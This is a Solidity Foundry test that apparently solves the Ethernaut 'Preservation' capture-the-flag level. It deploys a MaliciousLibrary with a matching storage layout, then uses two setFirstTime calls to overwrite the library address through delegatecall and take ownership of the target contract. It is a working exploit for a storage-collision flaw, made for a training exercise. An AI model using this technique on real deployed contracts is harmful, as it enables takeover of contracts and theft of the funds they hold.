// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Preservation, LibraryContract} from "../../src/Preservation/Preservation.sol";
import "forge-std/console2.sol";

interface IPreservation {
  function setFirstTime(uint) external;

  function setSecondTime(uint) external;

  function owner() external view returns (address);
}

contract MaliciousLibrary {
  address nevermind1;
  address nevermind2;
  address public owner;

  function setTime(uint256 _timestamp) external {
    owner = address(_timestamp);
  }
}

interface IMalicious {
  function owner() external view returns (address);
}

contract PreservationTest is LevelFactory {
  IPreservation preservation; 

  function setUp() public {
    vm.startPrank(deployer, deployer);
    address t1 = address(new LibraryContract());
    address t2 = address(new LibraryContract());
    preservation = IPreservation(address(new Preservation(t1, t2)));
    vm.stopPrank();
  }

  function testAttack() public {
    submitLevel("Preservation");
  }

  function _performTest() internal override {
    // the storage layout is not correct!
    MaliciousLibrary malLib = new MaliciousLibrary();
    preservation.setFirstTime(uint(address(malLib)));
    preservation.setFirstTime(uint(attacker));
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    assertEq(preservation.owner(), attacker);

    return preservation.owner() == attacker;
  }
}
